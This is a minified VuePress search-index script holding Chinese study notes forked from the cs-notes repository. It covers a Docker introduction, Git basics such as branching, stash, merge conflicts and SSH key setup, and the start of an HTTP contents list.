import{k as g,q as w,l as I,f as L,v as k,o as p,c as h,x as N,y as O,a as m,z as f,A as E,F as C,B as x,C as T,D as S,E as B}from"./app.d02315a2.js";import{_ as M}from"./plugin-vue_export-helper.21dcd24c.js";const G={},R=[{path:"/",title:"\u9996\u9875",pathLocale:"/",contents:[{header:"\u{1F6E0}\u5F00\u59CB",slug:"\u{1F6E0}\u5F00\u59CB",content:`\u672C\u6587\u6863\u4E3Afork\u6587\u6863,\u53EA\u662F\u4E3A\u4E86\u81EA\u5DF1\u65B9\u4FBF\u67E5\u9605
\u6E90\u5730\u5740https://github.com/CyC2018/cs-notes
License
\u672C\u4ED3\u5E93\u7684\u5185\u5BB9\u4E0D\u662F\u5C06\u7F51\u4E0A\u7684\u8D44\u6599\u968F\u610F\u62FC\u51D1\u800C\u6765\uFF0C\u9664\u4E86\u5C11\u90E8\u5206\u5F15\u7528\u4E66\u4E0A\u548C\u6280\u672F\u6587\u6863\u7684\u539F\u6587\uFF08\u8FD9\u90E8\u5206\u5185\u5BB9\u90FD\u5728\u672B\u5C3E\u7684\u53C2\u8003\u94FE\u63A5\u4E2D\u52A0\u4E86\u51FA\u5904\uFF09\uFF0C\u5176\u4F59\u90FD\u662F\u6211\u7684\u539F\u521B\u3002\u5728\u60A8\u5F15\u7528\u672C\u4ED3\u5E93\u5185\u5BB9\u6216\u8005\u5BF9\u5185\u5BB9\u8FDB\u884C\u4FEE\u6539\u6F14\u7ECE\u65F6\uFF0C\u8BF7\u7F72\u540D\u5E76\u4EE5\u76F8\u540C\u65B9\u5F0F\u5171\u4EAB\uFF0C\u8C22\u8C22\u3002
\u8F6C\u8F7D\u6587\u7AE0\u8BF7\u5728\u5F00\u5934\u660E\u663E\u5904\u6807\u660E\u8BE5\u9875\u9762\u5730\u5740\uFF0C\u516C\u4F17\u53F7\u7B49\u5176\u5B83\u8F6C\u8F7D\u8BF7\u8054\u7CFB zhengyc101@163.com\u3002
Logo\uFF1Alogomakr
\u77E5\u8BC6\u5171\u4EAB\u8BB8\u53EF\u534F\u8BAE`}]},{path:"/java/Docker.html",title:"Docker",pathLocale:"/",contents:[{header:"Docker",slug:"docker",content:""},{header:"\u4E00\u3001\u89E3\u51B3\u7684\u95EE\u9898",slug:"\u4E00\u3001\u89E3\u51B3\u7684\u95EE\u9898",content:`\u7531\u4E8E\u4E0D\u540C\u7684\u673A\u5668\u6709\u4E0D\u540C\u7684\u64CD\u4F5C\u7CFB\u7EDF\uFF0C\u4EE5\u53CA\u4E0D\u540C\u7684\u5E93\u548C\u7EC4\u4EF6\uFF0C\u5728\u5C06\u4E00\u4E2A\u5E94\u7528\u90E8\u7F72\u5230\u591A\u53F0\u673A\u5668\u4E0A\u9700\u8981\u8FDB\u884C\u5927\u91CF\u7684\u73AF\u5883\u914D\u7F6E\u64CD\u4F5C\u3002
Docker \u4E3B\u8981\u89E3\u51B3\u73AF\u5883\u914D\u7F6E\u95EE\u9898\uFF0C\u5B83\u662F\u4E00\u79CD\u865A\u62DF\u5316\u6280\u672F\uFF0C\u5BF9\u8FDB\u7A0B\u8FDB\u884C\u9694\u79BB\uFF0C\u88AB\u9694\u79BB\u7684\u8FDB\u7A0B\u72EC\u7ACB\u4E8E\u5BBF\u4E3B\u64CD\u4F5C\u7CFB\u7EDF\u548C\u5176\u5B83\u9694\u79BB\u7684\u8FDB\u7A0B\u3002\u4F7F\u7528 Docker \u53EF\u4EE5\u4E0D\u4FEE\u6539\u5E94\u7528\u7A0B\u5E8F\u4EE3\u7801\uFF0C\u4E0D\u9700\u8981\u5F00\u53D1\u4EBA\u5458\u5B66\u4E60\u7279\u5B9A\u73AF\u5883\u4E0B\u7684\u6280\u672F\uFF0C\u5C31\u80FD\u591F\u5C06\u73B0\u6709\u7684\u5E94\u7528\u7A0B\u5E8F\u90E8\u7F72\u5728\u5176\u5B83\u673A\u5668\u4E0A\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/011f3ef6-d824-4d43-8b2c-36dab8eaaa72-1.png" width="400px)`},{header:"\u4E8C\u3001\u4E0E\u865A\u62DF\u673A\u7684\u6BD4\u8F83",slug:"\u4E8C\u3001\u4E0E\u865A\u62DF\u673A\u7684\u6BD4\u8F83",content:`\u865A\u62DF\u673A\u4E5F\u662F\u4E00\u79CD\u865A\u62DF\u5316\u6280\u672F\uFF0C\u5B83\u4E0E Docker \u6700\u5927\u7684\u533A\u522B\u5728\u4E8E\u5B83\u662F\u901A\u8FC7\u6A21\u62DF\u786C\u4EF6\uFF0C\u5E76\u5728\u786C\u4EF6\u4E0A\u5B89\u88C5\u64CD\u4F5C\u7CFB\u7EDF\u6765\u5B9E\u73B0\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/be608a77-7b7f-4f8e-87cc-f2237270bf69.png" width="500)`},{header:"\u542F\u52A8\u901F\u5EA6",slug:"\u542F\u52A8\u901F\u5EA6",content:`\u542F\u52A8\u865A\u62DF\u673A\u9700\u8981\u5148\u542F\u52A8\u865A\u62DF\u673A\u7684\u64CD\u4F5C\u7CFB\u7EDF\uFF0C\u518D\u542F\u52A8\u5E94\u7528\uFF0C\u8FD9\u4E2A\u8FC7\u7A0B\u975E\u5E38\u6162\uFF1B
\u800C\u542F\u52A8 Docker \u76F8\u5F53\u4E8E\u542F\u52A8\u5BBF\u4E3B\u64CD\u4F5C\u7CFB\u7EDF\u4E0A\u7684\u4E00\u4E2A\u8FDB\u7A0B\u3002`},{header:"\u5360\u7528\u8D44\u6E90",slug:"\u5360\u7528\u8D44\u6E90",content:`\u865A\u62DF\u673A\u662F\u4E00\u4E2A\u5B8C\u6574\u7684\u64CD\u4F5C\u7CFB\u7EDF\uFF0C\u9700\u8981\u5360\u7528\u5927\u91CF\u7684\u78C1\u76D8\u3001\u5185\u5B58\u548C CPU \u8D44\u6E90\uFF0C\u4E00\u53F0\u673A\u5668\u53EA\u80FD\u5F00\u542F\u51E0\u5341\u4E2A\u7684\u865A\u62DF\u673A\u3002
\u800C Docker \u53EA\u662F\u4E00\u4E2A\u8FDB\u7A0B\uFF0C\u53EA\u9700\u8981\u5C06\u5E94\u7528\u4EE5\u53CA\u76F8\u5173\u7684\u7EC4\u4EF6\u6253\u5305\uFF0C\u5728\u8FD0\u884C\u65F6\u5360\u7528\u5F88\u5C11\u7684\u8D44\u6E90\uFF0C\u4E00\u53F0\u673A\u5668\u53EF\u4EE5\u5F00\u542F\u6210\u5343\u4E0A\u4E07\u4E2A Docker\u3002`},{header:"\u4E09\u3001\u4F18\u52BF",slug:"\u4E09\u3001\u4F18\u52BF",content:"\u9664\u4E86\u542F\u52A8\u901F\u5EA6\u5FEB\u4EE5\u53CA\u5360\u7528\u8D44\u6E90\u5C11\u4E4B\u5916\uFF0CDocker \u5177\u6709\u4EE5\u4E0B\u4F18\u52BF\uFF1A"},{header:"\u66F4\u5BB9\u6613\u8FC1\u79FB",slug:"\u66F4\u5BB9\u6613\u8FC1\u79FB",content:"\u63D0\u4F9B\u4E00\u81F4\u6027\u7684\u8FD0\u884C\u73AF\u5883\u3002\u5DF2\u7ECF\u6253\u5305\u597D\u7684\u5E94\u7528\u53EF\u4EE5\u5728\u4E0D\u540C\u7684\u673A\u5668\u4E0A\u8FDB\u884C\u8FC1\u79FB\uFF0C\u800C\u4E0D\u7528\u62C5\u5FC3\u73AF\u5883\u53D8\u5316\u5BFC\u81F4\u65E0\u6CD5\u8FD0\u884C\u3002"},{header:"\u66F4\u5BB9\u6613\u7EF4\u62A4",slug:"\u66F4\u5BB9\u6613\u7EF4\u62A4",content:"\u4F7F\u7528\u5206\u5C42\u6280\u672F\u548C\u955C\u50CF\uFF0C\u4F7F\u5F97\u5E94\u7528\u53EF\u4EE5\u66F4\u5BB9\u6613\u590D\u7528\u91CD\u590D\u7684\u90E8\u5206\u3002\u590D\u7528\u7A0B\u5EA6\u8D8A\u9AD8\uFF0C\u7EF4\u62A4\u5DE5\u4F5C\u4E5F\u8D8A\u5BB9\u6613\u3002"},{header:"\u66F4\u5BB9\u6613\u6269\u5C55",slug:"\u66F4\u5BB9\u6613\u6269\u5C55",content:"\u53EF\u4EE5\u4F7F\u7528\u57FA\u7840\u955C\u50CF\u8FDB\u4E00\u6B65\u6269\u5C55\u5F97\u5230\u65B0\u7684\u955C\u50CF\uFF0C\u5E76\u4E14\u5B98\u65B9\u548C\u5F00\u6E90\u793E\u533A\u63D0\u4F9B\u4E86\u5927\u91CF\u7684\u955C\u50CF\uFF0C\u901A\u8FC7\u6269\u5C55\u8FD9\u4E9B\u955C\u50CF\u53EF\u4EE5\u975E\u5E38\u5BB9\u6613\u5F97\u5230\u6211\u4EEC\u60F3\u8981\u7684\u955C\u50CF\u3002"},{header:"\u56DB\u3001\u4F7F\u7528\u573A\u666F",slug:"\u56DB\u3001\u4F7F\u7528\u573A\u666F",content:""},{header:"\u6301\u7EED\u96C6\u6210",slug:"\u6301\u7EED\u96C6\u6210",content:`\u6301\u7EED\u96C6\u6210\u6307\u7684\u662F\u9891\u7E41\u5730\u5C06\u4EE3\u7801\u96C6\u6210\u5230\u4E3B\u5E72\u4E0A\uFF0C\u8FD9\u6837\u80FD\u591F\u66F4\u5FEB\u5730\u53D1\u73B0\u9519\u8BEF\u3002
Docker \u5177\u6709\u8F7B\u91CF\u7EA7\u4EE5\u53CA\u9694\u79BB\u6027\u7684\u7279\u70B9\uFF0C\u5728\u5C06\u4EE3\u7801\u96C6\u6210\u5230\u4E00\u4E2A Docker \u4E2D\u4E0D\u4F1A\u5BF9\u5176\u5B83 Docker \u4EA7\u751F\u5F71\u54CD\u3002`},{header:"\u63D0\u4F9B\u53EF\u4F38\u7F29\u7684\u4E91\u670D\u52A1",slug:"\u63D0\u4F9B\u53EF\u4F38\u7F29\u7684\u4E91\u670D\u52A1",content:"\u6839\u636E\u5E94\u7528\u7684\u8D1F\u8F7D\u60C5\u51B5\uFF0C\u53EF\u4EE5\u5F88\u5BB9\u6613\u5730\u589E\u52A0\u6216\u8005\u51CF\u5C11 Docker\u3002"},{header:"\u642D\u5EFA\u5FAE\u670D\u52A1\u67B6\u6784",slug:"\u642D\u5EFA\u5FAE\u670D\u52A1\u67B6\u6784",content:"Docker \u8F7B\u91CF\u7EA7\u7684\u7279\u70B9\u4F7F\u5F97\u5B83\u5F88\u9002\u5408\u7528\u4E8E\u90E8\u7F72\u3001\u7EF4\u62A4\u3001\u7EC4\u5408\u5FAE\u670D\u52A1\u3002"},{header:"\u4E94\u3001\u955C\u50CF\u4E0E\u5BB9\u5668",slug:"\u4E94\u3001\u955C\u50CF\u4E0E\u5BB9\u5668",content:`\u955C\u50CF\u662F\u4E00\u79CD\u9759\u6001\u7684\u7ED3\u6784\uFF0C\u53EF\u4EE5\u770B\u6210\u9762\u5411\u5BF9\u8C61\u91CC\u9762\u7684\u7C7B\uFF0C\u800C\u5BB9\u5668\u662F\u955C\u50CF\u7684\u4E00\u4E2A\u5B9E\u4F8B\u3002
\u955C\u50CF\u5305\u542B\u7740\u5BB9\u5668\u8FD0\u884C\u65F6\u6240\u9700\u8981\u7684\u4EE3\u7801\u4EE5\u53CA\u5176\u5B83\u7EC4\u4EF6\uFF0C\u5B83\u662F\u4E00\u79CD\u5206\u5C42\u7ED3\u6784\uFF0C\u6BCF\u4E00\u5C42\u90FD\u662F\u53EA\u8BFB\u7684\uFF08read-only layers\uFF09\u3002\u6784\u5EFA\u955C\u50CF\u65F6\uFF0C\u4F1A\u4E00\u5C42\u4E00\u5C42\u6784\u5EFA\uFF0C\u524D\u4E00\u5C42\u662F\u540E\u4E00\u5C42\u7684\u57FA\u7840\u3002\u955C\u50CF\u7684\u8FD9\u79CD\u5206\u5C42\u5B58\u50A8\u7ED3\u6784\u5F88\u9002\u5408\u955C\u50CF\u7684\u590D\u7528\u4EE5\u53CA\u5B9A\u5236\u3002
\u6784\u5EFA\u5BB9\u5668\u65F6\uFF0C\u901A\u8FC7\u5728\u955C\u50CF\u7684\u57FA\u7840\u4E0A\u6DFB\u52A0\u4E00\u4E2A\u53EF\u5199\u5C42\uFF08writable layer\uFF09\uFF0C\u7528\u6765\u4FDD\u5B58\u7740\u5BB9\u5668\u8FD0\u884C\u8FC7\u7A0B\u4E2D\u7684\u4FEE\u6539\u3002`},{header:"\u53C2\u8003\u8D44\u6599",slug:"\u53C2\u8003\u8D44\u6599",content:`DOCKER 101: INTRODUCTION TO DOCKER WEBINAR RECAP
Docker \u5165\u95E8\u6559\u7A0B
Docker container vs Virtual machine
How to Create Docker Container using Dockerfile
\u7406\u89E3 Docker\uFF082\uFF09\uFF1ADocker \u955C\u50CF
\u4E3A\u4EC0\u4E48\u8981\u4F7F\u7528 Docker\uFF1F
What is Docker
\u6301\u7EED\u96C6\u6210\u662F\u4EC0\u4E48\uFF1F`}]},{path:"/java/Git.html",title:"Git",pathLocale:"/",contents:[{header:"Git",slug:"git",content:""},{header:"\u96C6\u4E2D\u5F0F\u4E0E\u5206\u5E03\u5F0F",slug:"\u96C6\u4E2D\u5F0F\u4E0E\u5206\u5E03\u5F0F",content:`Git \u5C5E\u4E8E\u5206\u5E03\u5F0F\u7248\u672C\u63A7\u5236\u7CFB\u7EDF\uFF0C\u800C SVN \u5C5E\u4E8E\u96C6\u4E2D\u5F0F\u3002 \u96C6\u4E2D\u5F0F\u7248\u672C\u63A7\u5236\u53EA\u6709\u4E2D\u5FC3\u670D\u52A1\u5668\u62E5\u6709\u4E00\u4EFD\u4EE3\u7801\uFF0C\u800C\u5206\u5E03\u5F0F\u7248\u672C\u63A7\u5236\u6BCF\u4E2A\u4EBA\u7684\u7535\u8111\u4E0A\u5C31\u6709\u4E00\u4EFD\u5B8C\u6574\u7684\u4EE3\u7801\u3002
\u96C6\u4E2D\u5F0F\u7248\u672C\u63A7\u5236\u6709\u5B89\u5168\u6027\u95EE\u9898\uFF0C\u5F53\u4E2D\u5FC3\u670D\u52A1\u5668\u6302\u4E86\u6240\u6709\u4EBA\u90FD\u6CA1\u529E\u6CD5\u5DE5\u4F5C\u4E86\u3002
\u96C6\u4E2D\u5F0F\u7248\u672C\u63A7\u5236\u9700\u8981\u8FDE\u7F51\u624D\u80FD\u5DE5\u4F5C\uFF0C\u5982\u679C\u7F51\u901F\u8FC7\u6162\uFF0C\u90A3\u4E48\u63D0\u4EA4\u4E00\u4E2A\u6587\u4EF6\u4F1A\u6162\u7684\u65E0\u6CD5\u8BA9\u4EBA\u5FCD\u53D7\u3002\u800C\u5206\u5E03\u5F0F\u7248\u672C\u63A7\u5236\u4E0D\u9700\u8981\u8FDE\u7F51\u5C31\u80FD\u5DE5\u4F5C\u3002
\u5206\u5E03\u5F0F\u7248\u672C\u63A7\u5236\u65B0\u5EFA\u5206\u652F\u3001\u5408\u5E76\u5206\u652F\u64CD\u4F5C\u901F\u5EA6\u975E\u5E38\u5FEB\uFF0C\u800C\u96C6\u4E2D\u5F0F\u7248\u672C\u63A7\u5236\u65B0\u5EFA\u4E00\u4E2A\u5206\u652F\u76F8\u5F53\u4E8E\u590D\u5236\u4E00\u4EFD\u5B8C\u6574\u4EE3\u7801\u3002`},{header:"\u4E2D\u5FC3\u670D\u52A1\u5668",slug:"\u4E2D\u5FC3\u670D\u52A1\u5668",content:`\u4E2D\u5FC3\u670D\u52A1\u5668\u7528\u6765\u4EA4\u6362\u6BCF\u4E2A\u7528\u6237\u7684\u4FEE\u6539\uFF0C\u6CA1\u6709\u4E2D\u5FC3\u670D\u52A1\u5668\u4E5F\u80FD\u5DE5\u4F5C\uFF0C\u4F46\u662F\u4E2D\u5FC3\u670D\u52A1\u5668\u80FD\u591F 24 \u5C0F\u65F6\u4FDD\u6301\u5F00\u673A\u72B6\u6001\uFF0C\u8FD9\u6837\u5C31\u80FD\u66F4\u65B9\u4FBF\u7684\u4EA4\u6362\u4FEE\u6539\u3002
Github \u5C31\u662F\u4E00\u4E2A\u4E2D\u5FC3\u670D\u52A1\u5668\u3002`},{header:"\u5DE5\u4F5C\u6D41",slug:"\u5DE5\u4F5C\u6D41",content:`\u65B0\u5EFA\u4E00\u4E2A\u4ED3\u5E93\u4E4B\u540E\uFF0C\u5F53\u524D\u76EE\u5F55\u5C31\u6210\u4E3A\u4E86\u5DE5\u4F5C\u533A\uFF0C\u5DE5\u4F5C\u533A\u4E0B\u6709\u4E00\u4E2A\u9690\u85CF\u76EE\u5F55 .git\uFF0C\u5B83\u5C5E\u4E8E Git \u7684\u7248\u672C\u5E93\u3002
Git \u7684\u7248\u672C\u5E93\u6709\u4E00\u4E2A\u79F0\u4E3A Stage \u7684\u6682\u5B58\u533A\u4EE5\u53CA\u6700\u540E\u7684 History \u7248\u672C\u5E93\uFF0CHistory \u5B58\u50A8\u6240\u6709\u5206\u652F\u4FE1\u606F\uFF0C\u4F7F\u7528\u4E00\u4E2A HEAD \u6307\u9488\u6307\u5411\u5F53\u524D\u5206\u652F\u3002 git add files \u628A\u6587\u4EF6\u7684\u4FEE\u6539\u6DFB\u52A0\u5230\u6682\u5B58\u533A
git commit \u628A\u6682\u5B58\u533A\u7684\u4FEE\u6539\u63D0\u4EA4\u5230\u5F53\u524D\u5206\u652F\uFF0C\u63D0\u4EA4\u4E4B\u540E\u6682\u5B58\u533A\u5C31\u88AB\u6E05\u7A7A\u4E86
git reset -- files \u4F7F\u7528\u5F53\u524D\u5206\u652F\u4E0A\u7684\u4FEE\u6539\u8986\u76D6\u6682\u5B58\u533A\uFF0C\u7528\u6765\u64A4\u9500\u6700\u540E\u4E00\u6B21 git add files
git checkout -- files \u4F7F\u7528\u6682\u5B58\u533A\u7684\u4FEE\u6539\u8986\u76D6\u5DE5\u4F5C\u76EE\u5F55\uFF0C\u7528\u6765\u64A4\u9500\u672C\u5730\u4FEE\u6539 \u53EF\u4EE5\u8DF3\u8FC7\u6682\u5B58\u533A\u57DF\u76F4\u63A5\u4ECE\u5206\u652F\u4E2D\u53D6\u51FA\u4FEE\u6539\uFF0C\u6216\u8005\u76F4\u63A5\u63D0\u4EA4\u4FEE\u6539\u5230\u5206\u652F\u4E2D\u3002 git commit -a \u76F4\u63A5\u628A\u6240\u6709\u6587\u4EF6\u7684\u4FEE\u6539\u6DFB\u52A0\u5230\u6682\u5B58\u533A\u7136\u540E\u6267\u884C\u63D0\u4EA4
git checkout HEAD -- files \u53D6\u51FA\u6700\u540E\u4E00\u6B21\u4FEE\u6539\uFF0C\u53EF\u4EE5\u7528\u6765\u8FDB\u884C\u56DE\u6EDA\u64CD\u4F5C`},{header:"\u5206\u652F\u5B9E\u73B0",slug:"\u5206\u652F\u5B9E\u73B0",content:"\u4F7F\u7528\u6307\u9488\u5C06\u6BCF\u4E2A\u63D0\u4EA4\u8FDE\u63A5\u6210\u4E00\u6761\u65F6\u95F4\u7EBF\uFF0CHEAD \u6307\u9488\u6307\u5411\u5F53\u524D\u5206\u652F\u6307\u9488\u3002 \u65B0\u5EFA\u5206\u652F\u662F\u65B0\u5EFA\u4E00\u4E2A\u6307\u9488\u6307\u5411\u65F6\u95F4\u7EBF\u7684\u6700\u540E\u4E00\u4E2A\u8282\u70B9\uFF0C\u5E76\u8BA9 HEAD \u6307\u9488\u6307\u5411\u65B0\u5206\u652F\uFF0C\u8868\u793A\u65B0\u5206\u652F\u6210\u4E3A\u5F53\u524D\u5206\u652F\u3002 \u6BCF\u6B21\u63D0\u4EA4\u53EA\u4F1A\u8BA9\u5F53\u524D\u5206\u652F\u6307\u9488\u5411\u524D\u79FB\u52A8\uFF0C\u800C\u5176\u5B83\u5206\u652F\u6307\u9488\u4E0D\u4F1A\u79FB\u52A8\u3002 \u5408\u5E76\u5206\u652F\u4E5F\u53EA\u9700\u8981\u6539\u53D8\u6307\u9488\u5373\u53EF\u3002"},{header:"\u51B2\u7A81",slug:"\u51B2\u7A81",content:`\u5F53\u4E24\u4E2A\u5206\u652F\u90FD\u5BF9\u540C\u4E00\u4E2A\u6587\u4EF6\u7684\u540C\u4E00\u884C\u8FDB\u884C\u4E86\u4FEE\u6539\uFF0C\u5728\u5206\u652F\u5408\u5E76\u65F6\u5C31\u4F1A\u4EA7\u751F\u51B2\u7A81\u3002 Git \u4F1A\u4F7F\u7528 <<<<<<< \uFF0C======= \uFF0C>>>>>>> \u6807\u8BB0\u51FA\u4E0D\u540C\u5206\u652F\u7684\u5185\u5BB9\uFF0C\u53EA\u9700\u8981\u628A\u4E0D\u540C\u5206\u652F\u4E2D\u51B2\u7A81\u90E8\u5206\u4FEE\u6539\u6210\u4E00\u6837\u5C31\u80FD\u89E3\u51B3\u51B2\u7A81\u3002
<<<<<<< HEAD
Creating a new branch is quick & simple.
=======
Creating a new branch is quick AND simple.
>>>>>>> feature1`},{header:"Fast forward",slug:"fast-forward",content:`"\u5FEB\u8FDB\u5F0F\u5408\u5E76"\uFF08fast-farward merge\uFF09\uFF0C\u4F1A\u76F4\u63A5\u5C06 master \u5206\u652F\u6307\u5411\u5408\u5E76\u7684\u5206\u652F\uFF0C\u8FD9\u79CD\u6A21\u5F0F\u4E0B\u8FDB\u884C\u5206\u652F\u5408\u5E76\u4F1A\u4E22\u5931\u5206\u652F\u4FE1\u606F\uFF0C\u4E5F\u5C31\u4E0D\u80FD\u5728\u5206\u652F\u5386\u53F2\u4E0A\u770B\u51FA\u5206\u652F\u4FE1\u606F\u3002
\u53EF\u4EE5\u5728\u5408\u5E76\u65F6\u52A0\u4E0A --no-ff \u53C2\u6570\u6765\u7981\u7528 Fast forward \u6A21\u5F0F\uFF0C\u5E76\u4E14\u52A0\u4E0A -m \u53C2\u6570\u8BA9\u5408\u5E76\u65F6\u4EA7\u751F\u4E00\u4E2A\u65B0\u7684 commit\u3002
git merge --no-ff -m "merge with no-ff" dev`},{header:"\u50A8\u85CF\uFF08Stashing\uFF09",slug:"\u50A8\u85CF-stashing",content:`\u5728\u4E00\u4E2A\u5206\u652F\u4E0A\u64CD\u4F5C\u4E4B\u540E\uFF0C\u5982\u679C\u8FD8\u6CA1\u6709\u5C06\u4FEE\u6539\u63D0\u4EA4\u5230\u5206\u652F\u4E0A\uFF0C\u6B64\u65F6\u8FDB\u884C\u5207\u6362\u5206\u652F\uFF0C\u90A3\u4E48\u53E6\u4E00\u4E2A\u5206\u652F\u4E0A\u4E5F\u80FD\u770B\u5230\u65B0\u7684\u4FEE\u6539\u3002\u8FD9\u662F\u56E0\u4E3A\u6240\u6709\u5206\u652F\u90FD\u5171\u7528\u4E00\u4E2A\u5DE5\u4F5C\u533A\u7684\u7F18\u6545\u3002
\u53EF\u4EE5\u4F7F\u7528 git stash \u5C06\u5F53\u524D\u5206\u652F\u7684\u4FEE\u6539\u50A8\u85CF\u8D77\u6765\uFF0C\u6B64\u65F6\u5F53\u524D\u5DE5\u4F5C\u533A\u7684\u6240\u6709\u4FEE\u6539\u90FD\u4F1A\u88AB\u5B58\u5230\u6808\u4E2D\uFF0C\u4E5F\u5C31\u662F\u8BF4\u5F53\u524D\u5DE5\u4F5C\u533A\u662F\u5E72\u51C0\u7684\uFF0C\u6CA1\u6709\u4EFB\u4F55\u672A\u63D0\u4EA4\u7684\u4FEE\u6539\u3002\u6B64\u65F6\u5C31\u53EF\u4EE5\u5B89\u5168\u7684\u5207\u6362\u5230\u5176\u5B83\u5206\u652F\u4E0A\u4E86\u3002
$ git stash
Saved working directory and index state \\ "WIP on master: 049d078 added the index file"
HEAD is now at 049d078 added the index file (To restore them type "git stash apply")
\u8BE5\u529F\u80FD\u53EF\u4EE5\u7528\u4E8E bug \u5206\u652F\u7684\u5B9E\u73B0\u3002\u5982\u679C\u5F53\u524D\u6B63\u5728 dev \u5206\u652F\u4E0A\u8FDB\u884C\u5F00\u53D1\uFF0C\u4F46\u662F\u6B64\u65F6 master \u4E0A\u6709\u4E2A bug \u9700\u8981\u4FEE\u590D\uFF0C\u4F46\u662F dev \u5206\u652F\u4E0A\u7684\u5F00\u53D1\u8FD8\u672A\u5B8C\u6210\uFF0C\u4E0D\u60F3\u7ACB\u5373\u63D0\u4EA4\u3002\u5728\u65B0\u5EFA bug \u5206\u652F\u5E76\u5207\u6362\u5230 bug \u5206\u652F\u4E4B\u524D\u5C31\u9700\u8981\u4F7F\u7528 git stash \u5C06 dev \u5206\u652F\u7684\u672A\u63D0\u4EA4\u4FEE\u6539\u50A8\u85CF\u8D77\u6765\u3002`},{header:"SSH \u4F20\u8F93\u8BBE\u7F6E",slug:"ssh-\u4F20\u8F93\u8BBE\u7F6E",content:`Git \u4ED3\u5E93\u548C Github \u4E2D\u5FC3\u4ED3\u5E93\u4E4B\u95F4\u7684\u4F20\u8F93\u662F\u901A\u8FC7 SSH \u52A0\u5BC6\u3002
\u5982\u679C\u5DE5\u4F5C\u533A\u4E0B\u6CA1\u6709 .ssh \u76EE\u5F55\uFF0C\u6216\u8005\u8BE5\u76EE\u5F55\u4E0B\u6CA1\u6709 id_rsa \u548C id_rsa.pub \u8FD9\u4E24\u4E2A\u6587\u4EF6\uFF0C\u53EF\u4EE5\u901A\u8FC7\u4EE5\u4E0B\u547D\u4EE4\u6765\u521B\u5EFA SSH Key\uFF1A
ssh-keygen -t rsa -C "youremail@example.com"
\u7136\u540E\u628A\u516C\u94A5 id_rsa.pub \u7684\u5185\u5BB9\u590D\u5236\u5230 Github "Account settings" \u7684 SSH Keys \u4E2D\u3002`},{header:".gitignore \u6587\u4EF6",slug:"gitignore-\u6587\u4EF6",content:`\u5FFD\u7565\u4EE5\u4E0B\u6587\u4EF6\uFF1A \u64CD\u4F5C\u7CFB\u7EDF\u81EA\u52A8\u751F\u6210\u7684\u6587\u4EF6\uFF0C\u6BD4\u5982\u7F29\u7565\u56FE\uFF1B
\u7F16\u8BD1\u751F\u6210\u7684\u4E2D\u95F4\u6587\u4EF6\uFF0C\u6BD4\u5982 Java \u7F16\u8BD1\u4EA7\u751F\u7684 .class \u6587\u4EF6\uFF1B
\u81EA\u5DF1\u7684\u654F\u611F\u4FE1\u606F\uFF0C\u6BD4\u5982\u5B58\u653E\u53E3\u4EE4\u7684\u914D\u7F6E\u6587\u4EF6\u3002 \u4E0D\u9700\u8981\u5168\u90E8\u81EA\u5DF1\u7F16\u5199\uFF0C\u53EF\u4EE5\u5230 https://github.com/github/gitignore \u4E2D\u8FDB\u884C\u67E5\u8BE2\u3002`},{header:"Git \u547D\u4EE4\u4E00\u89C8",slug:"git-\u547D\u4EE4\u4E00\u89C8",content:"\u6BD4\u8F83\u8BE6\u7EC6\u7684\u5730\u5740\uFF1Ahttp://www.cheat-sheets.org/saved-copy/git-cheat-sheet.pdf"},{header:"\u53C2\u8003\u8D44\u6599",slug:"\u53C2\u8003\u8D44\u6599",content:`Git - \u7B80\u660E\u6307\u5357
\u56FE\u89E3 Git
\u5ED6\u96EA\u5CF0 : Git \u6559\u7A0B
Learn Git Branching`}]},{path:"/java/HTTP.html",title:"HTTP",pathLocale:"/",contents:[{header:"HTTP",slug:"http",content:`HTTP \u4E00 \u3001\u57FA\u7840\u6982\u5FF5 \u8BF7\u6C42\u548C\u54CD\u5E94\u62A5\u6587
URL \u4E8C\u3001HTTP \u65B9\u6CD5 GET
HEAD
POST
PUT
PATCH
DELETE
OPTIONS
CONNECT
TRACE \u4E09\u3001HTTP \u72B6\u6001\u7801 1XX \u4FE1\u606F
2XX \u6210\u529F
3XX \u91CD\u5B9A\u5411
4XX \u5BA2\u6237\u7AEF\u9519\u8BEF
5XX \u670D\u52A1\u5668\u9519\u8BEF \u56DB\u3001HTTP \u9996\u90E8 \u901A\u7528\u9996\u90E8\u5B57\u6BB5
\u8BF7\u6C42\u9996\u90E8\u5B57\u6BB5
\u54CD\u5E94\u9996\u90E8\u5B57\u6BB5
\u5B9E\u4F53\u9996\u90E8\u5B57\u6BB5 \u4E94\u3001\u5177\u4F53\u5E94\u7528 \u8FDE\u63A5\u7BA1\u7406 1. \u77ED\u8FDE\u63A5\u4E0E\u957F\u8FDE\u63A5
2. \u6D41\u6C34\u7EBF Cookie 1. \u7528\u9014
2. \u521B\u5EFA\u8FC7\u7A0B
3. \u5206\u7C7B
4. \u4F5C\u7528\u57DF
5. JavaScript
6. HttpOnly
7. Secure
8. Session
9. \u6D4F\u89C8\u5668\u7981\u7528 Cookie
10. Cookie \u4E0E Session \u9009\u62E9 \u7F13\u5B58 1. \u4F18\u70B9
2. \u5B9E\u73B0\u65B9\u6CD5
3. Cache-Control
4. \u7F13\u5B58\u9A8C\u8BC1 \u5185\u5BB9\u534F\u5546 1. \u7C7B\u578B
2. Vary \u5185\u5BB9\u7F16\u7801
\u8303\u56F4\u8BF7\u6C42 1. Range
2. Accept-Ranges
3. \u54CD\u5E94\u72B6\u6001\u7801 \u5206\u5757\u4F20\u8F93\u7F16\u7801
\u591A\u90E8\u5206\u5BF9\u8C61\u96C6\u5408
\u865A\u62DF\u4E3B\u673A
\u901A\u4FE1\u6570\u636E\u8F6C\u53D1 1. \u4EE3\u7406
2. \u7F51\u5173
3. \u96A7\u9053 \u516D\u3001HTTPS \u52A0\u5BC6 1. \u5BF9\u79F0\u5BC6\u94A5\u52A0\u5BC6
2.\u975E\u5BF9\u79F0\u5BC6\u94A5\u52A0\u5BC6
3. HTTPS \u91C7\u7528\u7684\u52A0\u5BC6\u65B9\u5F0F \u8BA4\u8BC1
\u5B8C\u6574\u6027\u4FDD\u62A4
HTTPS \u7684\u7F3A\u70B9 \u4E03\u3001HTTP/2.0 HTTP/1.x \u7F3A\u9677
\u4E8C\u8FDB\u5236\u5206\u5E27\u5C42
\u670D\u52A1\u7AEF\u63A8\u9001
\u9996\u90E8\u538B\u7F29 \u516B\u3001HTTP/1.1 \u65B0\u7279\u6027
\u4E5D\u3001GET \u548C POST \u6BD4\u8F83 \u4F5C\u7528
